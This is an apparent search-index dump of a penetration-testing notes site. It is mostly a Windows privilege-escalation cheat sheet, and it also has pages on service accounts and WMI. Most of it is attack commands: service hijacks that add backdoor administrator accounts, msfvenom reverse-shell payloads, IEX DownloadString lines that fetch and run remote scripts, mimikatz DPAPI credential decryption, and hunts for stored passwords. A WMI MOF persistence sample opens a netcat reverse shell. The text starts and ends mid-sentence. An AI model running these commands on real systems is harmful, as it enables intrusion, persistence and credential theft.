lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ == \u200b )) Extraction credential file - masterkey (guidMasterKey) - https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials dpapi :: \u200b cred \u200b / \u200b in \u200b : 51 \u200b AB168BE4BDB3A603DADE4F8CA81290 / \u200b sid : S \u200b - 1 - 5 - 21 - 953262931 - 566350628 - 63446256 - 1001 / \u200b password \u200b : 4 \u200b Cc3ssC0ntr0ller Examine master key file dpapi :: \u200b masterkey \u200b / \u200b in \u200b : 0792 \u200b c32e \u200b - 48 \u200b a5 \u200b - 4 \u200b fe3 \u200b - 8 \u200b b43 \u200b - \u200b d93d64590580 / \u200b sid : S \u200b - 1 - 5 - 21 - 953262931 - 566350628 - 63446256 - 1001 / \u200b password \u200b : 4 \u200b Cc3ssC0ntr0ller Decrypt credential blob dpapi :: \u200b cred \u200b / \u200b in \u200b : 51 \u200b AB168BE4BDB3A603DADE4F8CA81290 Using Kernel Exploit Installed updates: wmic qfe get Caption , Description , HotFixID , InstalledOn KiTrap0d Using logical flaws Directory Replication Service (DRSR) Netlogon Remote Service (NRPC) BackupKey Remote Service (BKRP) Local Service Authority (Domain Policy) Remote Protocol (LSAD) Privilege Attribute Certificate Data Structure (PAC) Kerberos Kerberos Protocol Extension (KILE) Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU) Add user using service misconfiguration References https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ http://www.greyhathacker.net/?p=738 https://toshellandback.com/2015/11/24/ms-priv-esc https://www.toshellandback.com/2015/08/30/gpp/","title":"Privilege Escalation"},{"location":"os/windows/privilege-escalation/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"os/windows/privilege-escalation/#options","text":"Missing Patches Automated Deployment and Auto Logon Passwords AlwaysInstallElevated (any user can run MSI as SYSTEM) Misconfigured Services","title":"Options"},{"location":"os/windows/privilege-escalation/#guides","text":"https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Flow%20Charts/Privilege%20Escalation/windows.md https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/windows-services.md https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html","title":"Guides"},{"location":"os/windows/privilege-escalation/#tools","text":"https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb","title":"Tools"},{"location":"os/windows/privilege-escalation/#metasploit","text":"In 32bit systems: local_exploit_suggester In 64bit systems: search exploit / windows / local","title":"Metasploit"},{"location":"os/windows/privilege-escalation/#powerup","text":"PowerUp to check for all service misconfigurations: Invoke - AllChecks","title":"PowerUp"},{"location":"os/windows/privilege-escalation/#service-unquoted-path","text":"Get-ServiceUnquoted -Verbose Get-WmiObject -Class win32_service | f ` * When service path is unquoted: C : \\ PROGRAM FILES \\ SUB DIR \\ PROGRAM NAME Areas we can place files for exploit are marked with * C : \\ PROGRAM * FILES \\ SUB * DIR \\ PROGRAM * NAME Examples: c : \\ program . exe files \\ sub dir \\ program name c : \\ program files \\ sub . exe dir \\ program name c : \\ program files \\ sub dir \\ program . exe name","title":"Service Unquoted Path"},{"location":"os/windows/privilege-escalation/#service-binary-in-a-location-writable-to-current-user","text":"Replace the binary to gain code execution. Get - ModifiableServiceFile - Verbose","title":"Service binary in a location writable to current user"},{"location":"os/windows/privilege-escalation/#service-can-be-modified-by-current-user","text":"Get - ModifiableService - Verbose","title":"Service can be modified by current user"},{"location":"os/windows/privilege-escalation/#techniques","text":"","title":"Techniques"},{"location":"os/windows/privilege-escalation/#service-unquoted-path_1","text":"exploit / windows / local / trusted_service_path wmic service get name , displayname , pathname , startmode | findstr / i Auto | findstr / i / v C:\\Windows\\\\ | findstr / i / v C : \\ Program Files ( x86 ) \\ Program Folder \\ A Subfolder \\ Executable . exe Leads to running : C : \\ Program . exe C : \\ Program Files . exe C : \\ Program Files ( x86 ) \\ Program . exe C : \\ Program Files ( x86 ) \\ Program Folder \\ A . exe C : \\ Program Files ( x86 ) \\ Program Folder \\ A Subfolder \\ Executable . exe Insecure Setup: C : \\ Program Files ( x86 ) icacls C:\\Program Files (x86)\\Program Folder / grant Everyone :( OI )( CI ) F / T F = Full Control CI = Container Inherit \u2013 This flag indicates that subordinate containers will inherit this ACE . OI = Object Inherit \u2013 This flag indicates that subordinate files will inherit the ACE . sc stop Vulnerable Service sc start Vulnerable Service OR shutdown / r / t 0 Need to migrate (auto-migration)","title":"Service Unquoted Path"},{"location":"os/windows/privilege-escalation/#folder-service-executable-privileges","text":"When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\\Authenticated Users:(I)(M)) So any application that gets installed on the root can be tampered with by a non-admin user. - If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one. https://msdn.microsoft.com/en-us/library/bb727008.aspx If folder is writable, drop a exe and use \"Service Unquoted Path\" to execute: icacls C:\\Program Files (x86)\\Program Folder If service exe is writable to everyone, low privilege user can replace the exe with some other binary: icacls example . exe F = Full Control CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE . OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE . accesschk . exe - dqv C:\\ / accepteula","title":"Folder &amp; Service Executable Privileges"},{"location":"os/windows/privilege-escalation/#insecure-service-permissions","text":"exploit / windows / local / service_permissions","title":"Insecure Service Permissions"},{"location":"os/windows/privilege-escalation/#approach-1-check-permissions-of-service","text":"subinacl . exe / keyreg HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable Service / display If service is editable, change the ImagePath to another exe. reg add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service / t REG_EXPAND_SZ / v ImagePath / d C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe / f or create a local admin with: sc config Vulnerable Service binpath = net user eviladmin P4ssw0rd@ /add sc config Vulnerable Service binpath= net localgroup Administrators eviladmin / add","title":"Approach 1 - Check permissions of service"},{"location":"os/windows/privilege-escalation/#approach-2-check-services-a-given-user-can-edit","text":"accesschk . exe - uwcqv testuser * accesschk . exe - uwcqv Authenticated Users * / accepteula accesschk . exe - uwcqv * / accepteula sc config upnphost binpath = net user /add amxuser1 amxpass1234 sc config upnphost obj = .\\LocalSystem password = sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath = net localgroup administrators amxuser1 /add sc config upnphost obj = .\\LocalSystem password = sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath = net localgroup \\ Remote Desktop Users \\ amxuser1 /add sc config upnphost obj = .\\LocalSystem password = sc qc upnphost net stop upnphost net start upnphost net start upnphost","title":"Approach 2 - Check services a given user can edit"},{"location":"os/windows/privilege-escalation/#alwaysinstallelevated","text":"exploit / windows / local / always_install_elevated [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated = dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated = dword:00000001 reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer / v AlwaysInstallElevated reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer / v AlwaysInstallElevated Installing MSI: msiexec / quiet / qn / i malicious . msi Payload Generation: msfvenom - f msi - nouac - p windows / adduser USER = eviladmin PASS = P4ssw0rd @ - o add_user . msi msfvenom - p windows / meterpreter / reverse_tcp - e x86 / shikata_ga_nai LHOST = 192 . 168 . 2 . 60 LPORT = 8989 - f exe - o Payload . exe msfvenom - f msi - nouac - p windows / exec cmd = C:\\Users \\t estuser\\AppData\\Local\\Temp\\Payload.exe malicious . msi","title":"AlwaysInstallElevated"},{"location":"os/windows/privilege-escalation/#task-scheduler","text":"On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. Works only on Windows 2000, XP, or 2003 Must have local administrator net start Task Scheduler time at 06 : 42 / interactive C:\\Documents and Settings\\test\\Local Settings\\Temp\\Payload.exe","title":"Task Scheduler"},{"location":"os/windows/privilege-escalation/#dll-hijacking-dll-preloading-attack-or-a-binary-planting-attack","text":"https://github.com/Arvanaghi/Windows-DLL-Injector https://securityxploded.com/remote-dll-injector.php https://pentestlab.blog/2017/04/04/dll-injection/ https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx When an application dynamically loads a dynamic - link library without specifying a fully qualified path name , Windows attempts to locate the DLL by searching a well - defined set of directories in a particular order , as described in Dynamic - Link Library Search Order . The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) Services running under SYSTEM does not search through user path environment. Example: # include stdafx.h # include windows.h void _tmain ( int argc , _TCHAR * argv [] ) { LoadLibrary ( L hijackable.dll ) ; } Identify processes / services - Use procman ( https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx ). - Filter Result = NAME NOT FOUND and Path ends with dll - Look at the registry key ServiceDll of services ( Parameters ). msfvenom - p windows / x64 / meterpreter / reverse_tcp lhost = 192 . 168 . 2 . 60 lport = 8989 - f dll hijackable . dll","title":"DLL Hijacking (DLL preloading attack or a binary planting attack)"},{"location":"os/windows/privilege-escalation/#windows-7","text":"IKE and AuthIP IPsec Keying Modules ( IKEEXT ) \u2013 wlbsctrl . dll Windows Media Center Receiver Service ( ehRecvr ) \u2013 ehETW . dll Windows Media Center Scheduler Service ( ehSched ) \u2013 ehETW . dll Can run Media Center services over command line: schtasks . exe / run / I / TN \u201c\\ Microsoft \\ Windows \\ Media Center \\ mcupdate \u201d schtasks . exe / run / I / TN \u201c\\ Microsoft \\ Windows \\ Media Center \\ MediaCenterRecoveryTask \u201d schtasks . exe / run / I / TN \u201c\\ Microsoft \\ Windows \\ Media Center \\ ActivateWindowsSearch \u201d","title":"Windows 7"},{"location":"os/windows/privilege-escalation/#windows-xp","text":"Automatic Updates ( wuauserv ) \u2013 ifsproxy . dll Remote Desktop Help Session Manager ( RDSessMgr ) \u2013 SalemHook . dll Remote Access Connection Manager ( RasMan ) \u2013 ipbootp . dll Windows Management Instrumentation ( winmgmt ) \u2013 wbemcore . dll Audio Service ( STacSV ) \u2013 SFFXComm . dll SFCOM . DLL Intel ( R ) Rapid Storage Technology ( IAStorDataMgrSvc ) \u2013 DriverSim . dll Juniper Unified Network Service ( JuniperAccessService ) \u2013 dsLogService . dll Encase Enterprise Agent \u2013 SDDisk . dll","title":"Windows XP"},{"location":"os/windows/privilege-escalation/#migrations","text":"","title":"Migrations"},{"location":"os/windows/privilege-escalation/#cwdillegalindllsearch","text":"Allow user to change DLL search path algorithm [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] CWDIllegalInDllSearch 1, 2 or ffffffff ? The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ dlls not loaded ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user )","title":"CWDIllegalInDllSearch"},{"location":"os/windows/privilege-escalation/#setdlldirectory","text":"Removes the current working directory (CWD) from the search order SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) : The directory from which the application loaded [ added ] C :\\ program files \\ MyApp \\ 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SetDllDirectory(\"\") The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user )","title":"SetDllDirectory"},{"location":"os/windows/privilege-escalation/#safedllsearchmode","text":"Enabled by default Can disable using [ HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlSet \\ Control \\ Session Manager ] Calling the SetDllDirectory(\u201c\u201d) or SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) disables SafeDllSearchMode and uses the search order described for SetDllDirectory.","title":"SafeDllSearchMode"},{"location":"os/windows/privilege-escalation/#dev","text":"LoadLibraryEx (additional argument) SetEnvironmentVariable(TEXT(\u201cPATH\u201d),NULL) Change default installation folder to C:\\Program Files Fully qualified path when loading DLLs Use SetDllDirectory(\u201c\u201d) API removing the current working directory from the search order If software needs to be installed on the root check there are no binaries needing SYSTEM privileges If SYSTEM privileges are required then change the ACL\u2019s of the folder Remove the path entry from the SYSTEM path variable if not needed When enabled The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) When disabled The directory from which the application loaded [ moved up the list ] The current working directory ( CWD ) 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) Directories in the PATH environment variable ( system then user )","title":"DEV"},{"location":"os/windows/privilege-escalation/#stored-credentials","text":"C : \\ unattend . xml C : \\ sysprep . inf C : \\ sysprep \\ sysprep . xml dir c : \\ * vnc . ini / s / b / c dir c : \\ * ultravnc . ini / s / b / c dir c : \\ / s / b / c | findstr / si * vnc . ini findstr / si password * . txt | * . xml | * . ini findstr / si pass * . txt | * . xml | * . ini","title":"Stored Credentials"},{"location":"os/windows/privilege-escalation/#unattended-installations","text":"post / windows / gather / enum_unattend Look for UserAccounts tag of Unattend . xml , sysprep . xml and sysprep . inf across the system, including: C : \\ Windows \\ Panther \\ C : \\ Windows \\ Panther \\ Unattend \\ C : \\ Windows \\ System32 \\ C : \\ Windows \\ System32 \\ sysprep \\ Microsoft appends \"Password\" to all passwords within Unattend files before encoding them.","title":"Unattended Installations"},{"location":"os/windows/privilege-escalation/#group-policy-preferences-gpp","text":"Introduced from Windows Server 2008 https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati GPP allows for configuration of Domain-attached machines via group policy . Map drives (Drives.xml) Create Local Users Data Sources (DataSources.xml) Printer configuration (Printers.xml) Create/Update Services (Services.xml) Scheduled Tasks (ScheduledTasks.xml) Change local Administrator passwords GPPs are stored in the SYSVOL share, which is world-readable to authenticated users. \\\\ DOMAIN \\ SYSVOL \\ DOMAIN \\ Policies \\ findstr / S / I cpassword \\\\ FQDN \\ sysvol \\ FQDN \\ policies \\ * . xml Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the logged - in user and pull down policies. Group Policies for account management are stored on the Domain Controller in Groups . xml files buried in the SYSVOL folder ( \\\\ Domain \\ SYSVOL \\ DOMAIN \\ Policies ) cpassword is used to set passwords for the Local Administrator account. Password is AES-256 encrypted using a published key: https://msdn.microsoft.com/en-us/library/Cc422924.aspx Metasploit: post / windows / gather / credentials / gpp PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Get-CachedGPPPassword //For locally stored GP Files Get-GPPPassword //For GP Files stored in the DC Get - DecryptedPassword to decrypt the AES encryption http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip https://pentestlab.blog/tag/cpassword/ Decrypt encrypted password: gpp - decrypt $ cpassword Get - GPPPassword Get - NetOU - GUID {4C86DD57-4040-41CD-B163-58F208A26623} | % { Get - NetComputer - ADSPath $ _ } // All OUs connected to policy | List all domain machines tied to OU IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerUp.ps1 ) IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerView.ps1 ) Get - CachedGPPPassword Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899","title":"Group Policy Preferences (GPP)"},{"location":"os/windows/privilege-escalation/#defense","text":"Prevent passwords from getting added to GPP (KB2962486) and delete existing GPP from SYSVOL containing passwords. [ALERTING] Detect by setting Everyone:DENY on SYSVOL GPP file. (Logs: Audit access denied)","title":"Defense"},{"location":"os/windows/privilege-escalation/#token-impersonation","text":"PowerSploit / Incognito List all tokens Invoke - TokenManipulation - ShowAll List all unique and usable tokens Invoke - TokenManipulation - Enumerate Start new process with token of a user Invoke - TokenManipulation - ImpersonateUser - Username domain\\user Start new process with token of another process Invoke - TokenManipulation - CreateProcess C:\\Windown\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe - ProcessId 500","title":"Token Impersonation"},{"location":"os/windows/privilege-escalation/#cmdkey","text":"Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey / list Run a command as admin: runas / user : ACCESS \\ Administrator / savecred \u200b powershell - c IEX ( New - Object Net . Webclient ). downloadstring ( http://10.10.14.2/admin.ps1 ) powershell . exe - Credential TestDomain\\Me - NoNewWindow - ArgumentList Start-Process powershell.exe -Verb runAs Find all runas shortcuts: Get - ChildItem \u200b \u200b C:\\ \u200b * . lnk - Recurse - Force | ft fullname | \u200b Out - File \u200b shortcuts . txt ForEach \u200b ( \u200b $ file \u200b \u200b in \u200b gc . \\ shortcuts . txt ) { \u200b Write - Output \u200b \u200b $ file \u200b ; gc \u200b $ file \u200b | Select - String \u200b runas }","title":"cmdkey"},{"location":"os/windows/privilege-escalation/#windows-data-protection-api","text":"Locating credential files cmd \u200b / c \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Protect \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Protect Transfer [ Convert ]:: ToBase64String ( [ IO.File ]:: ReadAllBytes ( \u200b C:\\Users\\security\\AppData\\Roamin g\\Microsoft\\Credentials\\51AB168BE4BDB3A603DADE4F8CA81290 \u200b )) [ IO.File ]:: WriteAllBytes ( \u200b 51AB168BE4BDB3A603DADE4F8CA81290 \u200b , [ Convert ]:: FromBase64String ( \u200b AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6 VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7 c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ == \u200b )) Extraction credential file - masterkey (guidMasterKey) - https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials dpapi :: \u200b cred \u200b / \u200b in \u200b : 51 \u200b AB168BE4BDB3A603DADE4F8CA81290 / \u200b sid : S \u200b - 1 - 5 - 21 - 953262931 - 566350628 - 63446256 - 1001 / \u200b password \u200b : 4 \u200b Cc3ssC0ntr0ller Examine master key file dpapi :: \u200b masterkey \u200b / \u200b in \u200b : 0792 \u200b c32e \u200b - 48 \u200b a5 \u200b - 4 \u200b fe3 \u200b - 8 \u200b b43 \u200b - \u200b d93d64590580 / \u200b sid : S \u200b - 1 - 5 - 21 - 953262931 - 566350628 - 63446256 - 1001 / \u200b password \u200b : 4 \u200b Cc3ssC0ntr0ller Decrypt credential blob dpapi :: \u200b cred \u200b / \u200b in \u200b : 51 \u200b AB168BE4BDB3A603DADE4F8CA81290","title":"Windows Data Protection API"},{"location":"os/windows/privilege-escalation/#using-kernel-exploit","text":"Installed updates: wmic qfe get Caption , Description , HotFixID , InstalledOn KiTrap0d","title":"Using Kernel Exploit"},{"location":"os/windows/privilege-escalation/#using-logical-flaws","text":"","title":"Using logical flaws"},{"location":"os/windows/privilege-escalation/#directory-replication-service-drsr","text":"","title":"Directory Replication Service (DRSR)"},{"location":"os/windows/privilege-escalation/#netlogon-remote-service-nrpc","text":"","title":"Netlogon Remote Service (NRPC)"},{"location":"os/windows/privilege-escalation/#backupkey-remote-service-bkrp","text":"","title":"BackupKey Remote Service (BKRP)"},{"location":"os/windows/privilege-escalation/#local-service-authority-domain-policy-remote-protocol-lsad","text":"","title":"Local Service Authority (Domain Policy) Remote Protocol (LSAD)"},{"location":"os/windows/privilege-escalation/#privilege-attribute-certificate-data-structure-pac","text":"","title":"Privilege Attribute Certificate Data Structure (PAC)"},{"location":"os/windows/privilege-escalation/#kerberos","text":"","title":"Kerberos"},{"location":"os/windows/privilege-escalation/#kerberos-protocol-extension-kile","text":"","title":"Kerberos Protocol Extension (KILE)"},{"location":"os/windows/privilege-escalation/#kerberos-protocol-extension-service-for-user-and-constrained-delegation-protocol-sfu","text":"","title":"Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU)"},{"location":"os/windows/privilege-escalation/#add-user-using-service-misconfiguration","text":"","title":"Add user using service misconfiguration"},{"location":"os/windows/privilege-escalation/#references","text":"https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ http://www.greyhathacker.net/?p=738 https://toshellandback.com/2015/11/24/ms-priv-esc https://www.toshellandback.com/2015/08/30/gpp/","title":"References"},{"location":"os/windows/user-accounts/","text":"https://social.msdn.microsoft.com/Forums/sqlserver/en-US/31d57870-1faa-4e14-8527-ce77b1ff40e4/local-service-local-system-or-network-service?forum=sqlsecurity Local System Local System is a very high-privileged built-in account. It has extensive privileges on the local system and acts as the computer on the network. The actual name of the account is \"NT AUTHORITY\\SYSTEM\". Local Service The Local Service account is a built-in account that has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard the system if individual services or processes are compromised. Services that run as the Local Service account access network resources as a null session without credentials. Be aware that the Local Service account is not supported for the SQL Server or SQL Server Agent services. The actual name of the account is \"NT AUTHORITY\\LOCAL SERVICE\". Network Service The Network Service account is a built-in account that has more access to resources and objects than members of the Users group. Services that run as the Network Service account access network resources by using the credentials of the computer account. The actual name of the account is \"NT AUTHORITY\\NETWORK SERVICE\"","title":"User accounts"},{"location":"os/windows/user-accounts/#local-system","text":"Local System is a very high-privileged built-in account. It has extensive privileges on the local system and acts as the computer on the network. The actual name of the account is \"NT AUTHORITY\\SYSTEM\".","title":"Local System"},{"location":"os/windows/user-accounts/#local-service","text":"The Local Service account is a built-in account that has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard the system if individual services or processes are compromised. Services that run as the Local Service account access network resources as a null session without credentials. Be aware that the Local Service account is not supported for the SQL Server or SQL Server Agent services. The actual name of the account is \"NT AUTHORITY\\LOCAL SERVICE\".","title":"Local Service"},{"location":"os/windows/user-accounts/#network-service","text":"The Network Service account is a built-in account that has more access to resources and objects than members of the Users group. Services that run as the Network Service account access network resources by using the credentials of the computer account. The actual name of the account is \"NT AUTHORITY\\NETWORK SERVICE\"","title":"Network Service"},{"location":"os/windows/wmi/","text":"WMI Implementation of Common Information Model (CIM) and Web-Based Enterprise Management (WBEM) WBEM standard encompasses the design of an extensible enterprise data-collection and data-management facility that has the flexibility and extensibility required to manage local and remote systems that comprise arbitrary components WMI consists of four main components: management applications WMI infrastructure providers managed objects (system, disks, processes, network components...) Allows Execute some code when the notification of an event http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html CIM - Common Information Model https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf CIM classes hierarchically organized with subclasses grouped in namespaces (logical group of classes) root\\cimv2 includes most of the classes that represent computer's resources Categories Core Classes - Applies to all areas of management (__System_Security) Common Classes - Extension of core classes (CIM_UnitaryComputerSystem) Extended Classes - Technology specific addition to common classes (Win32_ComputerSystem) Types Abstract - Template classes used to define other classes. Static - Stores data WMI configuration Operational data Dynamic - Retrieved from a provider, and represents managed resource (process, service, file, etc.) Association - Describe relationship between classes or resources. WMI Provider Bridge between managed object and WMI Provide access to classes Namespaces CIM classes are decided logically using namespaces For easier discovery and use root \\ cimv2 root \\ default root \\ security root \\ subscription WMI repository - stores CIM classes' definitions %SystemRoot%\\System32\\wbem\\Repository Interesting CIM classes - __EventFilter [ create ]: permits to define a Windows event - __EventConsumer : (abstract consumer class) - ActiveScriptEventConsumer : possible to embed VBScript or JSScript in the consumer (only available in root \\ subscription ) - Consumer runs with SYSTEM privilege on Windows XP and Windows 2003 Server - Vista , it is running under the LOCAL_SERVICE user - __FilterToConsumerBinding : link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs) MOF (Managed Object Format) Language used to describe CIM classes, namespaces and providers MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI CIM class(es) MOF describes are added into the repository Stored in %SystemRoot%\\System32\\wbem Compilation Compiled using mofcomp . exe Auto compile register Writable to Administrator only Files added to %SystemRoot%\\System32\\wbem\\mof\\ get auto compiled and registered (before Vista) Logs are in %SystemRoot%\\System32\\wbem\\mof\\Logs\\mofcomp.log Wait for a windows event and trigger: # pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) instance of __EventFilter as $ FILTER { Name = CLASS_FIRST_TEST ; EventNamespace = root\\\\cimv2 ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \\ Win32_NTLogEvent\\ AND TargetInstance.LogFile=\\ Application\\ ; QueryLanguage = WQL ; } ; instance of ActiveScriptEventConsumer as $ CONSUMER { Name = CLASS_FIRST_TEST ; ScriptingEngine = VBScript ; ScriptText = Set objShell = CreateObject(\\ WScript.Shell\\ )\\n objShell.Run \\ C : \\\\ Windows \\\\ system32 \\\\ cmd . exe / C C : \\\\ nc . exe 192.168.38.1 1337 - e C : \\\\ Windows \\\\ system32 \\\\ cmd . exe \\ \\n ; } ; instance of __FilterToConsumerBinding { Consumer = $CONSUMER ; Filter = $FILTER ; } ; Ref: http://www.hsc-news.com/archives/2011/000078.html Self start: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) class WoootClass { [ key ] string Name ; } ; instance of __EventFilter as $ FILTER { Name = XPLOIT_TEST_SYSTEM ; EventNamespace = root\\\\subscription ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\ WoootClass \\ ; QueryLanguage = WQL ; } ; instance of ActiveScriptEventConsumer as $ CONSUMER { // ... } ; instance of __FilterToConsumerBinding { // ... } ; instance of WoootClass { Name = Woot ; } ; Usages - Automatically kill some processes as soon as they are launched (anti-rootkits...), - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper), - Automatically infect USB devices Exploring Exploring Namespaces Get - WmiObject - Namespace root - Class __Namespace | select name Get - CimInstance - Namespace root - Class __Namespace To read nested namespaces: Get - WmiNamespace Exploring Classes - Namespace root \\ cimv2 is the default of Powershell Get - WmiObject - Class * bios * - List Get - CimClasses - List List only dynamic classes Get - CimClasses - QualifierName dynamic - List Look at details of the class Get - WmiObject - Class Win32_Bios | fl * Get - CimInstance - ClassName Win32_Bios | fl * Using WMI Class Get-WmiObject -Class Win32_Process | Where-Object { $_.Name - eq explorer.exe } Get-WmiObject -Class Win32_Process | where name -eq explorer.exe Get-WmiObject -Query Select * from Win32_Process where Name = explorer.exe Get - CimInstance - ClassName Win32_Process - Filter Name -eq explorer.exe Get - CimInstance - Query Select * from Win32_Process where Name = explorer.exe Can use Remove - WmiObject and Remove - CimInstance to close processed, remove registry entries, etc. Methods Identifying methods: Get-WmiObject * -List | Where-Object { $_.Method } (Get-WmiObject -Class Win32_Process -List).Methods Get-CimClass -Class Win32_Process -List | Select -ExpandProperty Methods Get - CimClass - MethodName * Get - CimClass - MethodName * create * Get - CimClass - ClassName 